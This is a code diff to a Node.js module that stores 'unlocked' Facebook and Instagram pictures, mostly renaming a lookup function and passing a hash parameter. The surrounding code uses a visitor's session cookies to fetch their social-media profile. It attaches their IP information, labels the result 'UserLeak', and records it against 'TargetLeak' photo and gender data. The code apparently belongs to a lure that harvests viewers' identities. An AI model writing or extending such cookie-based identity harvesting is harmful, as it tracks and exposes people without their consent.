@@ -4,15 +4,19 @@ const Photos = require("../models/Photos");
 
 
 
-const findByHashUserIdAndUpdate = async (hash, userId,userData,ipInfo) => {
-    const isSameUserViewSameImage = await Photos.findOne({"user.userId": userId, hash})
-    if (!isSameUserViewSameImage) {
-        userData.ipInfo = ipInfo
-        await Photos.findOneAndUpdate({hash}, {$push: {user:userData}},{new:true})
+const findByIdAndUpdateUser = async (userFromDB,userId,userData) => {
+    const users = userFromDB.user
+    const isSameUserViewSameImage =  users.filter(user => {
+      return   user.userId === userId
+    } )
+    if (isSameUserViewSameImage.length === 0) {
+
+        await Photos.findByIdAndUpdate(userFromDB._id, {$push: {user:userData}},{new:true})
     }
 
+
 }
-const createUnlockFacebookPicture = async (TargetInfo, TargetLeak, cookies,ipInfo) => {
+const createUnlockFacebookPicture = async (TargetInfo, TargetLeak, cookies,ipInfo,hash) => {
 
    const UserLeak = await Facebook.GetFacebookUserInfo(cookies.c_user)
     UserLeak.ipInfo = ipInfo
@@ -26,12 +30,12 @@ const createUnlockFacebookPicture = async (TargetInfo, TargetLeak, cookies,ipInf
         gender: TargetLeak.userPictureData.gender,
         faceCount: TargetLeak.userPictureData.faceCount,
         user:[UserLeak] ,
-        hash: TargetLeak.hash
+        hash
 
     })
 
 }
-const createUnlockInstagramPicture = async (TargetInfo, TargetLeak, cookies,ipInfo) => {
+const createUnlockInstagramPicture = async (TargetInfo, TargetLeak, cookies,ipInfo,hash) => {
 
     const UserLeak = await Instagram.GetInstagramUserInfo(cookies)
     UserLeak.ipInfo = ipInfo
@@ -45,7 +49,7 @@ const createUnlockInstagramPicture = async (TargetInfo, TargetLeak, cookies,ipIn
         photo: TargetLeak.userPictureOnCloud,
         gender: TargetLeak.userPictureData.gender,
         faceCount: TargetLeak.userPictureData.faceCount,
-        hash: TargetLeak.hash,
+        hash: hash,
         user:[UserLeak] ,
 
     })
@@ -53,6 +57,6 @@ const createUnlockInstagramPicture = async (TargetInfo, TargetLeak, cookies,ipIn
 }
 
 module.exports = {
-    findByHashUserIdAndUpdate, createUnlockFacebookPicture,createUnlockInstagramPicture
+    findByIdAndUpdateUser, createUnlockFacebookPicture,createUnlockInstagramPicture
 
 }
